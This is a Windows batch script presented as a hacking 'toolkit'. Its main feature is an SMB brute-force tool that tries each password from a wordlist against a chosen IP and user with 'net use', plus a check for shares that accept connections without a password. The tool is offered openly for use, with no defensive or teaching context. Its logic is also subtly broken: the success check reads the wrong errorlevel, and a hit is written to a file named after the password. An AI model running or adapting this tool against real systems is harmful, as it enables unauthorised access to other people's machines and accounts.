@echo off

REM banners "patorjk's cheese"
mode 75, 30
chcp 65001 >nul
call powershell exit >nul
color A
cd files

REM Menu
:menu
cls
title TOOLKIT
echo.
type "menubanner.txt"
echo.
echo.
echo         TOOLS
echo       ---------
echo     1) Pc info
echo     2) SMB Bruteforce
echo.
set /p menuinput=
if /I "%menuinput%" EQU "1" goto pcinfo
if /I "%menuinput%" EQU "2" goto smb
echo Not valid Tool. Try again!
pause
goto menu

REM Pc Info
:pcinfo
cls
title Pc Info
type "pcinfo.txt"
echo.
systeminfo
pause
goto menu

REM SMB Bruteforce
:smb
cls
title SMB Bruteforce
type "smb.txt"
echo.
echo.
echo       SMB TOOLS
echo       ---------
echo     1) With user and password
echo     2) Only ip (usefull to connect to localhost etc.)
echo.
set /p smbinput=
if /I "%smbinput%" EQU "1" goto smbUsrPsswrd
if /I "%smbinput%" EQU "2" goto smbOnlyIp
echo Not valid SMB Tool. Try again!
pause
goto smb

:smbUsrPsswrd
cls
title SMB Bruteforce User and Password
type "smb.txt"
echo.
set /p ip="Enter the target IP: "
set /p user="Enter the target user: "
set /p wordlist="Enter the password list: "

set /a count=1
for /f %%a in (%wordlist%) do (
    set pass=%%a
    call :attempt
)
echo.
echo Password not found for %user% %ip%! :(
pause
goto menu

:smbOnlyIp
cls
title SMB Bruteforce Only Ip
type "smb.txt"
echo.
set /p ip="Enter the target IP: "
net use \\%ip% >nul 2>&1
if %errorlevel% EQU 0 (
    echo.
    echo Able to connect to %ip% without password!
    net use \\%ip% /d /y >nul 2>&1
    pause
    goto menu
) else (
    echo.
    echo Unable to connect to %ip% without password :(
    net use \\%ip% /d /y >nul 2>&1
    pause
    goto menu
)

:success
echo.
echo Password found for %user% %ip%! >> %pass%
net use \\%ip% /d /y >nul 2>&1
pause
goto menu

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success

REM Others